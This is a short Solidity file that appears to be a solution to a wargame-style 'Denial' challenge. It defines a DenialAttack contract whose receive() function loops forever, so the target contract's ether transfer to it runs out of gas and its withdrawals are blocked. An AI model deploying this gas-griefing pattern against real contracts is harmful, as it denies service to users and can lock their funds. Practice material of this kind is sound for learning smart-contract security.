// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Denial} from "../src/Denial.sol";

contract DenialAttack {
    constructor() {}

    receive() external payable {
        while (true) {}
    }
}
